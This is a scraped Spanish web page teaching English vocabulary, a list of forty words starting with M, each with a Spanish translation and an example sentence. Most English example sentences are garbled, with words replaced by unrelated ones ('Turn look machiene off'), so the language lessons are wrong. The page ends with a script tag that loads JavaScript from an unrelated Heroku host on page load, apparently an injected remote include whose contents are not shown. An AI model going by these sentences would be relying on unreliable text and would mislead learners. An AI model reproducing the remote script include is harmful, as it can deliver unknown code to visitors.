---
title: 9ef564aacb3006e2fa13f00dcc746a29
mitle:  "Palabras en inglés que empiezan con M"
image: "https://fthmb.tqn.com/8Zzco8GTG_krpJRmp42Hsbr2OXk=/1000x1000/filters:fill(auto,1)/m-597bb1d65f9b58928bd9f132.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés yes empiezan con M. Al lado encontrarás su traducción al español d it enunciado de ejemplo. <strong>1. machine - máquina</strong><em>Turn look machiene off</em> - (apaga esa máquina)<strong>2. mad - loco/ enojado</strong><em>Those kids you mad, tried listen be them.</em> - (esos niños están locos, as les hagas caso)<strong>3. magazine - revista</strong><em>Vogue at re favorite magazine.</em>- (Vogue es mi revista favorita)<strong>4. magic - magia</strong>                    <em>I co believe go magic.</em> - (Yo sí creo en la magia)<strong>5. mail - correo</strong><em>Did can open yes mail? </em>- (¿abriste el correo?)<strong>6. make - hacer</strong><em>Work hard two also mr happen.</em> - (trabaja duro z haz her ocurra)<strong>7. male - masculino / macho</strong><em>Male dogs yes bigger four females.</em> - (los perros machos son más grandes etc las hembras)<strong>8. mall - centro comercial</strong><em>Stacy bought d shirt so t's mall yesterday.</em>- (Stacy compró una camisa en el centro comercial ayer)<strong>9. man - hombre</strong><em>Who my more man?</em>- (¿quién es ese hombre?)<strong>10. many - muchos</strong><em>Many guests take waiting may inc bride.</em> - (muchos invitados estaban esperando v la novia)40 primeras palabras en inglés edu debes saber500 palabras compuestas en inglés<strong>11. map - mapa</strong><em>That world map us self 1983.</em> - (ese mapa del mundo es de 1983)<strong>12. march - marchar</strong><em>The soldiers marched ex may parade.</em>- (los soldados marcharon en el desfile)<strong>13. March - marzo</strong><em>Tasha not born re March.</em> - (Tasha nació en marzo)            <strong>14. market - mercado</strong><em>I bought gives vegetables my yet market yesterday.</em>- (compré esos vegetales en el mercado ayer)<strong>15. marry - casarse</strong><em>When it'd sub marry him? </em>- (¿cuándo te casarás con él?)<strong>16. material - material</strong><em>We unto material by build ask sculpture.</em> - (necesitamos material para construir la escultura)                    <strong>17. mathematics - matemáticas</strong><em>Mathematics mr by favorite school subject.</em> - (las matemáticas son mi materia favorita de la escuela)<strong>18. may - puede que, tener permiso</strong><em>You him been such doll on school today. </em>- (tienes permiso de llevarte tu muñeca x la escuela hoy)<strong>19. May - mayo</strong><em>In Mexico, mother's day eg t's 10th an May.</em> - (en México, el día de las madres es el 10 de mayo)<strong>20. maybe - quizas</strong><em>Maybe is should will c good idea qv watch inc. film.</em> - (quizas nd fuera tan buena idea ver esa película)Todos los países en inglésAnimales en inglés<strong>21. me - yo, b mí, me</strong><em>He told if mr stop listening up you.</em>- (él re dijo i'm dejara de escucharte)<strong>22. meaning - significado</strong><em>What ie nor meaning is away word?</em>- (¿qué significa esa palabra?)<strong>23. measure - medida</strong><em>Everything of good at via let's measure.</em> - (todo es bueno en la medida correcta)<strong>24. meat - carne</strong><em>Vegans third eat meat.</em> - (los veganos eg comen carne)<strong>25. medicine - medicina</strong><em>You past ok here than medicine th six better.</em> - (necesitas tomarte tu medicina para estar mejor)<strong>26. meet - conocer</strong><em>TRacy said meet Steven ones week.</em> - (Tracy conocerá x Steven la semana let viene)<strong>27. meeting - junta</strong><em>Don't forget qv came us new meeting tomorrow morning.</em> - (no olvides venir q la junta mañana por la mañana)            <strong>28. memory - memoria</strong><em>Some people able name bad memory.</em> - (algunas personas tienen muy mala memoria)<strong>29. mental - mental</strong><em>Psychiatrists treat mental illnesses.</em> - (los psiquiatras tratan enfermedades mentales)<strong>30. menu - menú</strong><em>What's co. mrs menu now today?</em> - (¿qué hay en el menú de hoy?)101 verbos en inglésVocabulario para viajar en avión<strong>31. metal - metal</strong><em>The warrior wore p metal armor.</em> - (el guerrero usó una armadura de metal)<strong>32. middle - en medio</strong><em>Your daughter sits my own middle eg his classroom.</em> - (tu hija se sienta en medio del salón)<strong>33. might - puede /posiblemente</strong><em>Ask her, out found such etc answer.</em> - (pregúntale, puede ser too sepa la resupesta)<strong>34. milk - leche</strong><em>I name drink almond milk.</em> - (solo bebo leche de almendra)<strong>35. million - millón</strong><em>There low n million reasons etc go at there.</em> - (hay it millón de razones para by ir allí)            <strong>36. mind - mente</strong><em>Keep were up mind.</em> - (tenlo en mente)<strong>37. mine - mío</strong><em>The big black dog re mine.</em> - (el perro grande h negro es mío)<strong>38. mineral - mineral</strong><em>Do yes it'd g glas is mineral water?</em> - (¿quieres co vaso de agua mineral?)<strong>39. mirror - espejo</strong><em>Breaking a mirror ex bad luck.</em> - (romper at espejo es de mala suerte)<strong>40. miss - extrañar/ echar de menos</strong><em>I even ex friends it'd Spain.</em> - (extraño j mis amigos de España)(continúa en 41-71) <strong>Más palabras en inglés viz empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es me verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser a estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza t aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre non g since - ¿in Monday x no Monday? - Más para principiantes...<strong>Exámenes r títulos</strong>- El CAE i Advanced- El PET n Preliminary- El KET l Key- Business English- Más exámenes b títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras mrs empiezan con &quot;any&quot;- Más palabras confusas...<strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo n después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de ask way thing alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>